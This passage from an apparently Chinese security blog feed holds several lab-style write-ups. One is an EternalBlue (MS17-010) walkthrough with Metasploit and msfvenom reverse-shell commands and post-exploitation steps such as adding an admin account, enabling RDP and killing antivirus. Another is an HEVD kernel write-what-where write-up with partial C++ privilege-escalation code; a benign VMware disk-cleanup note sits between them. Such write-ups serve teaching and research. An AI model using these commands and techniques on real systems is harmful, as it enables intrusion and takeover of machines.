alt="img"></p><h3><span id="pxie-lu-nei-he-di-zhi">泄露内核地址</span><a href="#pxie-lu-nei-he-di-zhi" class="header-anchor">#</a></h3><p>使用桌面堆风水泄露Pallete结构中的pFirstColor的内核地址</p>]]></content>
      <categories>
        <category>research</category>
        <category>windows</category>
      </categories>
      <tags>
        <tag>research</tag>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>MS17-010 永恒之蓝利用</title>
    <url>/24e83041.html</url>
    <content><![CDATA[<blockquote><p>攻击机：kali</p><p>被攻击机：win7sp1</p></blockquote><a id="more"></a><h2><span id="phuo-qu-shell">获取shell</span><a href="#phuo-qu-shell" class="header-anchor">#</a></h2><h3><span id="pshi-yong-msf-gong-ji">使用msf攻击</span><a href="#pshi-yong-msf-gong-ji" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue</span><br><span class="line">set PAYLOAD windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set rhosts target_ip</span><br><span class="line">set lhosts attacker_ip</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>顺利的话这个时候已经获得了一个meterpreter交互界面了</p><h3><span id="pshi-yong-exploit-db-jiao-ben-gong-ji">使用exploit-db脚本攻击</span><a href="#pshi-yong-exploit-db-jiao-ben-gong-ji" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Usage: python3 .&#x2F;ms17-010.py --host xxx --file xxx --port xxx</span><br><span class="line"></span><br><span class="line">[!] You can make a nc reverse shell USER_SHELLCODE_FILE in kali2.0 by use :</span><br><span class="line">    &quot;msfvenom -p windows&#x2F;x64&#x2F;shell_reverse_tcp   LHOST&#x3D;x.x.x.x LPORT&#x3D;xxx -f raw &gt; shellcode&quot;</span><br><span class="line"></span><br><span class="line">[!] You can make a meterpreter reverse shell USER_SHELLCODE_FILE in kali2.0 by use :</span><br><span class="line">    &quot;msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp  LHOST&#x3D;x.x.x.x LPORT&#x3D;xxx -f raw &gt; shellcode&quot;</span><br></pre></td></tr></table></figure><p>使用msfvenom生成shellcode，然后使用脚本即可，但是攻击没有msf的稳定，需要执行好几次才能弹出来</p><p>meterpreter监听：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit&#x2F;multi&#x2F;handler </span><br><span class="line">set PAYLOAD windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set lhost x.x.x.x</span><br><span class="line">set lport xxx</span><br></pre></td></tr></table></figure><p>代码见：<a href="https://blackwolfsec.cc/static/code/ms17-010.py">https://blackwolfsec.cc/static/code/ms17-010.py</a></p><h3><span id="pshi-yong-github-zui-huo-de-jiao-ben-gong-ji">使用github最火的脚本攻击</span><a href="#pshi-yong-github-zui-huo-de-jiao-ben-gong-ji" class="header-anchor">#</a></h3><ul><li><a href="https://github.com/worawit/MS17-010">https://github.com/worawit/MS17-010</a></li></ul><p>生成shellcode</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nasm -f bin eternalblue_kshellcode_x64.asm -o eternalblue_kshellcode_x64.bin   </span><br><span class="line">msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;xxx lport&#x3D;xxx -f raw -o reverse_shell.raw EXITFUNC&#x3D;thread </span><br><span class="line">cat eternalblue_kshellcode_x64.bin reverse_shell.raw &gt; shellcode.bin</span><br></pre></td></tr></table></figure><p>攻击</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 eternalblue_exploit7.py 10.1.1.4 shellcode.bin</span><br></pre></td></tr></table></figure><p>我试了一下会蓝屏</p><h2><span id="phou-xu-huan-jie">后续环节</span><a href="#phou-xu-huan-jie" class="header-anchor">#</a></h2><ul><li><p>开启cmd：shell</p></li><li><p>cmd乱码问题：chcp 65001</p></li><li><p>提权到system：getsystem</p></li><li><p>添加账户：net user test test /add</p></li><li><p>添加账户到管理员组：net localgroup administrators test /add</p></li><li><p>添加账户到远程桌面组：net localgroup “Remote Desktop Users” test /add</p></li><li><p>开启远程桌面：run post/windows/manage/enable_rdp 或者 run getgui -e</p></li><li><p>代理转发：portfwd add -l 2222 -r 10.1.1.129 -p 3389</p></li><li><p>打开远程桌面：rdesktop 127.1.1.0:2222</p></li><li><p>关闭杀软：killav</p></li><li><p>获取主机信息：run scraper/run winenum</p></li><li><p>查看主机应用：run post/windows/gather/enum_applications</p></li><li><p>查看主机用户：run post/windows/gather/enum_logged_on_users</p></li></ul><p>还有更多环节可以参考：<a href="https://github.com/SEC-GO/Red-vs-Blue/blob/master/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9Dms17-010%E7%9A%84%E5%88%A9%E7%94%A8.md">https://github.com/SEC-GO/Red-vs-Blue/blob/master/永恒之蓝ms17-010的利用.md</a></p><h2><span id="pcan-kao-zi-liao">参考资料</span><a href="#pcan-kao-zi-liao" class="header-anchor">#</a></h2><ul><li><p><a href="http://oddboy.cn/2017/ms17-010-python%E8%84%9A%E6%9C%ACexploit/">http://oddboy.cn/2017/ms17-010-python脚本exploit/</a></p></li><li><p><a href="https://blackwolfsec.cc/2017/05/12/Eternalblue_ms17-010/">https://blackwolfsec.cc/2017/05/12/Eternalblue_ms17-010/</a></p></li><li><p><a href="https://github.com/SEC-GO/Red-vs-Blue/blob/master/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9Dms17-010%E7%9A%84%E5%88%A9%E7%94%A8.md">https://github.com/SEC-GO/Red-vs-Blue/blob/master/永恒之蓝ms17-010的利用.md</a></p></li></ul>]]></content>
      <categories>
        <category>CTF</category>
        <category>pentest</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pentest</tag>
      </tags>
  </entry>
  <entry>
    <title>VMware Fusion 清理虚拟机磁盘</title>
    <url>/65b262b3.html</url>
    <content><![CDATA[<blockquote><p>在虚拟机中删除文件，但是虚拟机磁盘占用并不会直接缩小，而是需要使用碎片回收的方法清理磁盘，减小占用空间</p></blockquote><a id="more"></a><h2><span id="pxu-ni-ji-ci-pan-qing-ling">虚拟机磁盘清零</span><a href="#pxu-ni-ji-ci-pan-qing-ling" class="header-anchor">#</a></h2><ul><li>Windows使用<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/sdelete">Sdelete</a>将磁盘清零</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sdelete -z C:</span><br></pre></td></tr></table></figure><ul><li>Linux</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo cat &#x2F;dev&#x2F;zero &gt; zero;sync;sleep 1;sudo rm zero</span><br></pre></td></tr></table></figure><h2><span id="psu-zhu-ji-qing-li-ci-pan">宿主机清理磁盘</span><a href="#psu-zhu-ji-qing-li-ci-pan" class="header-anchor">#</a></h2><ul><li>清理磁盘碎片</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;vmware-vdiskmanager -d path_to_your&#x2F;disc.vmdk</span><br></pre></td></tr></table></figure><ul><li>回收磁盘空间</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;vmware-vdiskmanager -k path_to_your&#x2F;disc.vmdk</span><br></pre></td></tr></table></figure><h2><span id="pcan-kao">参考</span><a href="#pcan-kao" class="header-anchor">#</a></h2><ul><li><p><a href="https://blog.csdn.net/pcsxk/article/details/52013446">https://blog.csdn.net/pcsxk/article/details/52013446</a></p></li><li><p><a href="https://zzqcn.github.io/misc/vmware/reduce-disk-size.html">https://zzqcn.github.io/misc/vmware/reduce-disk-size.html</a></p></li></ul>]]></content>
      <categories>
        <category>work</category>
      </categories>
      <tags>
        <tag>work</tag>
      </tags>
  </entry>
  <entry>
    <title>HEVD ArbitraryOverwrite BitMap [win10v1511x86]</title>
    <url>/ec47a9ad.html</url>
    <content><![CDATA[<blockquote><p>前面，我们通过复写内核中的HalDispatchTable实现了提权，但是在Win10以后，想在内核中执行shellcode需要绕过很多保护措施的，因此这里我们引入一种新的方法实现对内核的利用</p></blockquote><a id="more"></a><h2><span id="pli-yong-fen-xi">利用分析</span><a href="#pli-yong-fen-xi" class="header-anchor">#</a></h2><p>我们本质上还是要实现将exp进程的token替换为System的token，where是exp进程token地址，what是System进程token</p><h3><span id="pzhao-system-jin-cheng-token">找System进程token</span><a href="#pzhao-system-jin-cheng-token" class="header-anchor">#</a></h3><p>原理：windows kernel中存在一个PsInitialSystemProcess的指针，指向System进程的EPROCESS</p><blockquote><p>windows kernel在不同环境下有不同名称：</p><ul><li>ntoskrnl 单处理器，不支持PAE</li><li>ntkrnlpa 单处理器，支持PAE</li><li>ntkrnlmp 多处理器，不支持PAE</li><li>ntkrpamp 多处理器，支持PAE</li></ul></blockquote><p>我们调试看看</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; dd nt!PsInitialSystemProcess</span><br><span class="line"><span class="number">83f</span>a703c  <span class="number">855f</span>89e8 <span class="number">83f</span>72640 <span class="number">8</span>ec414b0 <span class="number">00010000</span></span><br><span class="line"><span class="number">83f</span>a704c  <span class="number">00000</span>cd8 <span class="number">00000258</span> <span class="number">00000000</span> <span class="number">00000001</span></span><br><span class="line"><span class="number">83f</span>a705c  <span class="number">00000000</span> <span class="number">0000004b</span> <span class="number">00000001</span> <span class="number">00989680</span></span><br><span class="line"><span class="number">83f</span>a706c  <span class="number">00000000</span> <span class="number">00000029</span> <span class="number">00000002</span> c0ffffff</span><br><span class="line"><span class="number">83f</span>a707c  c0607ff8 <span class="number">00000000</span> <span class="number">00000000</span> c0403080</span><br><span class="line"><span class="number">83f</span>a708c  <span class="number">00000000</span> <span class="number">00000100</span> <span class="number">00000500</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">83f</span>a709c  <span class="number">00000001</span> <span class="number">00000000</span> <span class="number">00000003</span> <span class="number">00040107</span></span><br><span class="line"><span class="number">83f</span>a70ac  <span class="number">00000000</span> <span class="number">83f</span>a70b0 <span class="number">83f</span>a70b0 <span class="number">00000000</span></span><br><span class="line">kd&gt; !<span class="built_in">process</span> <span class="number">4</span> <span class="number">0</span> </span><br><span class="line">Searching <span class="keyword">for</span> <span class="built_in">Process</span> with Cid == <span class="number">4</span></span><br><span class="line">PROCESS <span class="number">855f</span>89e8  SessionId: none  Cid: <span class="number">0004</span>    Peb: <span class="number">00000000</span>  ParentCid: <span class="number">0000</span></span><br><span class="line">    DirBase: <span class="number">00185000</span>  ObjectTable: <span class="number">89201b</span>60  HandleCount: <span class="number">552.</span></span><br><span class="line">    Image: System</span><br></pre></td></tr></table></figure><p>PsInitialSystemProcess的值我们可以在用户态使用API获取到，但是即使我们知道了，EPROCESS的地址，我们也没有足够的权限去读写它，这个时候就需要用到BitMap这个东西了</p><h3><span id="pbitmap-jie-gou">BitMap结构</span><a href="#pbitmap-jie-gou" class="header-anchor">#</a></h3><p>BitMap是Windows GDI的一个对象，存在于内核中，可以帮助我们实现任意地址读写。</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-31-03-upload_6c619c03efe57acbb12f556c46175be9.png" alt="img"><br>当新建一个BitMap对象时，会在内核中分配三个结构，分别是BaseObject,SURFObj和Pixel Data，其中SURFOBJ中的pvScan0指向Pixel Data</p><p><strong>BASEOBJECT</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">BASEOBJECT32</span> // 5 <span class="title">elements</span>, 0<span class="title">x10</span> <span class="title">bytes</span> (<span class="title">sizeof</span>)</span></span><br><span class="line"><span class="class"> &#123;</span></span><br><span class="line">	ULONG32 hHmgr;</span><br><span class="line">	ULONG32 ulShareCount;</span><br><span class="line">	WORD cExclusiveLock;</span><br><span class="line">	WORD BaseFlags;</span><br><span class="line">	ULONG32 Tid;</span><br><span class="line"> &#125;BASEOBJECT32, *PBASEOBJECT32; </span><br><span class="line"> </span><br><span class="line"> <span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">BASEOBJECT64</span> // 0<span class="title">x18</span></span></span><br><span class="line"><span class="class"> &#123;</span></span><br><span class="line">	ULONG64 hHmgr;</span><br><span class="line">	ULONG32 ulShareCount;</span><br><span class="line">	WORD cExclusiveLock;</span><br><span class="line">	WORD BaseFlags;</span><br><span class="line">	ULONG64 Tid;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">void</span> <span class="keyword">operator</span>=(<span class="keyword">const</span> BASEOBJECT32 &amp;base )</span><br><span class="line">	&#123;</span><br><span class="line">		hHmgr = base.hHmgr;</span><br><span class="line">		ulShareCount = base.ulShareCount;</span><br><span class="line">		cExclusiveLock = base.cExclusiveLock;</span><br><span class="line">		BaseFlags = base.cExclusiveLock;</span><br><span class="line">		Tid = base.Tid;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">bool</span> <span class="keyword">operator</span>==(<span class="keyword">const</span> _BASEOBJECT64 &amp;base )</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> ((hHmgr == base.hHmgr) &amp;&amp; (Tid == base.Tid));</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">dump</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		dprint(<span class="string">"BASEOBJECT:\n"</span>);</span><br><span class="line">		dprint(<span class="string">"\thHmgr: %08lx\n"</span>, hHmgr);</span><br><span class="line">		dprint(<span class="string">"\tulShareCount: %08lx\n"</span>, ulShareCount);</span><br><span class="line">		dprint(<span class="string">"\tcExclusiveLock: %04lx\n"</span>, cExclusiveLock);</span><br><span class="line">		dprint(<span class="string">"\tBaseFlags: %04lx\n"</span>, BaseFlags);</span><br><span class="line">		dprint(<span class="string">"\tTid: %016I64x\n\n"</span>, Tid);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"> &#125;BASEOBJECT64, *PBASEOBJECT64;</span><br></pre></td></tr></table></figure><p>参考：<a href="https://github.com/panoramixor/GDIObjDump/blob/master/src/GDIObjDump/common.h">https://github.com/panoramixor/GDIObjDump/blob/master/src/GDIObjDump/common.h</a></p><p>再看<strong>SURFOBJ</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">SURFOBJ32</span> &#123;</span> pvScan0偏移<span class="number">0x20</span></span><br><span class="line">	ULONG32 dhsurf;  <span class="comment">// +4</span></span><br><span class="line">	ULONG32  hsurf;  <span class="comment">// +4</span></span><br><span class="line">	ULONG32 dhpdev;  <span class="comment">// +4</span></span><br><span class="line">	ULONG32   hdev;  <span class="comment">// +4</span></span><br><span class="line">	SIZEL  sizlBitmap; <span class="comment">// +8</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        typedef struct tagSIZE</span></span><br><span class="line"><span class="comment">        &#123;</span></span><br><span class="line"><span class="comment">            LONG        cx;</span></span><br><span class="line"><span class="comment">            LONG        cy;</span></span><br><span class="line"><span class="comment">        &#125; SIZE, *PSIZE, *LPSIZE;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        typedef SIZE               SIZEL;</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">	ULONG  cjBits;   <span class="comment">// +4</span></span><br><span class="line">	ULONG32  pvBits; <span class="comment">// +4</span></span><br><span class="line">	ULONG32  pvScan0; </span><br><span class="line">	LONG   lDelta;</span><br><span class="line">	ULONG  iUniq;</span><br><span class="line">	ULONG  iBitmapFormat;</span><br><span class="line">	USHORT iType;</span><br><span class="line">	USHORT fjBitmap;</span><br><span class="line">&#125; SURFOBJ32 ;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">SURFOBJ64</span> &#123;</span> pvScan0偏移<span class="number">0x38</span></span><br><span class="line">	ULONG64  dhsurf; <span class="comment">// +8</span></span><br><span class="line">	ULONG64  hsurf;  <span class="comment">// +8</span></span><br><span class="line">	ULONG64  dhpdev; <span class="comment">// +8</span></span><br><span class="line">	ULONG64  hdev;   <span class="comment">// +8</span></span><br><span class="line">	SIZEL  sizlBitmap; <span class="comment">// +8</span></span><br><span class="line">	ULONG64  cjBits; <span class="comment">// +8</span></span><br><span class="line">	ULONG64  pvBits; <span class="comment">// +8</span></span><br><span class="line">	ULONG64  pvScan0;</span><br><span class="line">	LONG32  lDelta;</span><br><span class="line">	ULONG32  iUniq;</span><br><span class="line">	ULONG32  iBitmapFormat;</span><br><span class="line">	USHORT  iType;</span><br><span class="line">	USHORT  fjBitmap;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">void</span> <span class="keyword">operator</span>=(<span class="keyword">const</span> SURFOBJ32 &amp;surf )</span><br><span class="line">	&#123;</span><br><span class="line">		dhsurf = surf.dhsurf;</span><br><span class="line">		hsurf = surf.hsurf;</span><br><span class="line">		dhpdev = surf.dhpdev;</span><br><span class="line">		hdev = surf.hdev;</span><br><span class="line">		sizlBitmap = surf.sizlBitmap;</span><br><span class="line">		cjBits = surf.cjBits;</span><br><span class="line">		pvBits = surf.pvBits;</span><br><span class="line">		pvScan0 = surf.pvScan0;</span><br><span class="line">		lDelta = surf.lDelta;</span><br><span class="line">		iUniq = surf.iUniq;</span><br><span class="line">		iBitmapFormat = surf.iBitmapFormat;</span><br><span class="line">		iType = surf.iType;</span><br><span class="line">		fjBitmap = surf.fjBitmap;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125; SURFOBJ64;</span><br></pre></td></tr></table></figure><p>重点关注其中的pvScan0变量，我们通过<a href="https://docs.microsoft.com/en-us/windows/win32/api/wingdi/nf-wingdi-getbitmapbits">GetBitmapBits</a>和<a href="https://docs.microsoft.com/en-us/windows/win32/api/wingdi/nf-wingdi-setbitmapbits">SetBitmapBits</a>来读写pvScan0指向的PixelData数据区</p><h3><span id="pguan-jian-dian-pvscan0">关键点pvScan0</span><a href="#pguan-jian-dian-pvscan0" class="header-anchor">#</a></h3><p>pvScan0指向的PixelData位于内核之中，因此如果可以控制pvScan0的值，我们就可以通过API去读写任意地址了。<br>我们再看一下CreateBitMap函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">HBITMAP <span class="title">CreateBitmap</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">int</span>        nWidth,</span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">int</span>        nHeight,</span></span></span><br><span class="line"><span class="function"><span class="params">  UINT       nPlanes,</span></span></span><br><span class="line"><span class="function"><span class="params">  UINT       nBitCount,</span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">const</span> VOID *lpBits</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><p><a href="https://docs.microsoft.com/en-us/windows/win32/api/wingdi/nf-wingdi-createbitmap">https://docs.microsoft.com/en-us/windows/win32/api/wingdi/nf-wingdi-createbitmap</a><br>其中的lpBits描述如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lpBits</span><br><span class="line"></span><br><span class="line">A pointer to an array of color data used to set the colors in a rectangle of pixels. Each scan line in the rectangle must be word aligned (scan lines that are not word aligned must be padded with zeros). If this parameter is NULL, the contents of the new bitmap is undefined.</span><br></pre></td></tr></table></figure><p>而对应的pvScan0描述如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pvScan0</span><br><span class="line"></span><br><span class="line">Pointer to the first scan line of the bitmap. If iBitmapFormat is BMF_JPEG or BMF_PNG, this member is NULL.</span><br></pre></td></tr></table></figure><p><a href="https://docs.microsoft.com/en-us/windows/win32/api/winddi/ns-winddi-surfobj">https://docs.microsoft.com/en-us/windows/win32/api/winddi/ns-winddi-surfobj</a></p><p>CreateBitmap 创建 Bitmap 对象后，会返回对应的资源句柄，该句柄的低16位是数组的访问下标</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">UINT index &#x3D; hBitmap &amp; 0xFFFF;</span><br></pre></td></tr></table></figure><p>通过该下标可以找到对应的GDI对象描述</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">GDI_CELL</span> <span class="title">GdiSharedHandleTable</span>[0<span class="title">x8fff</span>];</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">GDI_CELL</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    IntPtr pKernelAddress;</span><br><span class="line">    UInt16 wProcessId;</span><br><span class="line">    UInt16 wCount;</span><br><span class="line">    UInt16 wUpper;</span><br><span class="line">    UInt16 wType;</span><br><span class="line">    IntPtr pUserAddress;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里GdiSharedHandleTable可以通过TEB-&gt;PEB-&gt;GdiSharedHandleTable的路径获取到。<br>GDI_CELL结构在32位下大小为0x10，64位下为0x18。它的第一个指针 pKernelAddress 指向了 BASEOBJECT 的第一个字节，也就是说</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pvScan0 &#x3D; *(PDWORD32)pKernelAddress + (x86:0x10,x64:0x18) + (x86:0x20,x64:0x38)</span><br></pre></td></tr></table></figure><p>正是 pvScan0 的地址,具体偏移计算在前面结构处可以看到。至此，由于Windows实现问题，我们已经可以在用户态找到内核中的pvScan0地址了</p><h3><span id="pbitmap-li-yong">BITMAP利用</span><a href="#pbitmap-li-yong" class="header-anchor">#</a></h3><p>总的来说，当我们有了一个任意地址写任意值的能力时，我们可以通过以下流程使用BITMAP进行利用</p><ol><li>新建BITMAP结构</li><li>用户态获取位于内核中的pvScan0地址</li><li>任意地址写漏洞改写 pvScan0 的值为我们想要读写的地址</li><li>使用GetBitMapBits和SetBitMapBits读写任意值</li></ol><p>但是上面的流程好像只比原来的漏洞多了一个读的能力，当漏洞只能触发一次时，一次读写根本不能满足我们想要达到的目的，那怎么实现多次任意读写实现对内核的完全控制呢？这里就要通过两个BitMap结构实现了。</p><p>Manager + Worker实现读写内核完全控制<br><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-31-03-upload_c57402a45a6b759e664eb6ee99ee3c1d.png" alt="img"></p><p>具体流程如下：</p><ol><li>用户态新建Manager和Worker两个BitMap</li><li>使用任意地址写覆盖Manager的pvScan0为Worker的pvScan0地址</li><li>在用户态，操作Manager，可以替换Worker的pvScan0地址，再通过Worker来读写任意内存</li><li>通过任意地址读获取System进程的token</li><li>通过任意地址写替换当前进程token</li></ol><h2><span id="pc-exp-vs2017">C++ exp(VS2017)</span><a href="#pc-exp-vs2017" class="header-anchor">#</a></h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Psapi.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">WRITE_WHAT_WHERE</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	PULONG_PTR What;</span><br><span class="line">	PULONG_PTR Where;</span><br><span class="line">&#125; WRITE_WHAT_WHERE, *PWRITE_WHAT_WHERE;</span><br><span class="line"><span class="keyword">char</span> driverName[<span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">readOOB</span><span class="params">(HBITMAP hManager, HBITMAP hWorker, DWORD32 whereWrite, LPVOID whatWrite, <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	SetBitmapBits(hManager, len, &amp;whereWrite); <span class="comment">// set 写的是 hWorker 的 pvScan0 的值 , 通过控制 hWorker 的 pvScan0 的值来决定对哪块地址进行读写</span></span><br><span class="line">	GetBitmapBits(hWorker, len, whatWrite);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">writeOOB</span><span class="params">(HBITMAP hManager, HBITMAP hWorker, DWORD32 whereWrite, LPVOID whatWrite, <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	SetBitmapBits(hManager, len, &amp;whereWrite);</span><br><span class="line">	SetBitmapBits(hWorker, len, &amp;whatWrite);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD32 <span class="title">getKernelBase</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	LPVOID lpImageBase[<span class="number">1024</span>];</span><br><span class="line">	DWORD lpcbNeeded;</span><br><span class="line">	<span class="comment">//Retrieves the load address for each device driver in the system</span></span><br><span class="line">	EnumDeviceDrivers(lpImageBase, <span class="keyword">sizeof</span>(lpImageBase), &amp;lpcbNeeded);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">1024</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//Retrieves the base name of the specified device driver</span></span><br><span class="line">		GetDeviceDriverBaseNameA(lpImageBase[i], (<span class="keyword">char</span>*)driverName, <span class="number">48</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (!<span class="built_in">strncmp</span>((<span class="keyword">char</span>*)driverName, <span class="string">"nt"</span>, <span class="number">2</span>))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"[+]success to get %s\n"</span>, driverName);</span><br><span class="line">			<span class="keyword">return</span> (DWORD32)lpImageBase[i];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD32 <span class="title">getSystemEProcessAddr</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	DWORD32 ntKernelBase = getKernelBase();</span><br><span class="line">	<span class="keyword">if</span> (ntKernelBase) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Success get ntKernelBase: 0x%p\n"</span>, ntKernelBase);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Failed get ntKernelBase\n"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	DWORD32 ntUserBase = <span class="literal">NULL</span>;</span><br><span class="line">	ntUserBase = (DWORD32)LoadLibraryA(driverName);</span><br><span class="line">	<span class="keyword">if</span> (ntUserBase) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Success get ntUserBase: 0x%p\n"</span>, ntUserBase);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Failed get ntUserBase\n"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	DWORD32 PsInitialSystemProcessUserSpaceAddr = (DWORD32)GetProcAddress((HMODULE)ntUserBase, <span class="string">"PsInitialSystemProcess"</span>);</span><br><span class="line">	<span class="keyword">if</span> (!PsInitialSystemProcessUserSpaceAddr) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Failed get PsInitialSystemProcessUserSpaceAddr\n"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Success get PsInitialSystemProcessUserSpaceAddr: 0x%p\n"</span>, PsInitialSystemProcessUserSpaceAddr);</span><br><span class="line">	&#125;</span><br><span class="line">	DWORD32 PsInitialSystemProcessKernelSpaceAddr = ntKernelBase + (PsInitialSystemProcessUserSpaceAddr - ntUserBase);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"PsInitialSystemProcessKernelSpaceAddr:0x%p"</span>, PsInitialSystemProcessKernelSpaceAddr);</span><br><span class="line">	<span class="keyword">return</span> PsInitialSystemProcessKernelSpaceAddr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">DWORD32 <span class="title">getpvScan0Address</span><span class="params">(HBITMAP handle)</span> </span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"    handle value: 0x%p\n"</span>, (DWORD32)handle);</span><br><span class="line"></span><br><span class="line">	DWORD32 tebAddr = (DWORD32)NtCurrentTeb();</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"    tebAddr: 0x%p\n"</span>, tebAddr);</span><br><span class="line"></span><br><span class="line">	DWORD32 pebAddr = *(PDWORD32)((PUCHAR)tebAddr + <span class="number">0x30</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"    pebAddr: 0x%p\n"</span>, pebAddr);</span><br><span class="line"></span><br><span class="line">	DWORD32 GdiSharedHandleTableAddr = *(PDWORD32)((PUCHAR)pebAddr + <span class="number">0x94</span>);</span><br><span class="line">	<span 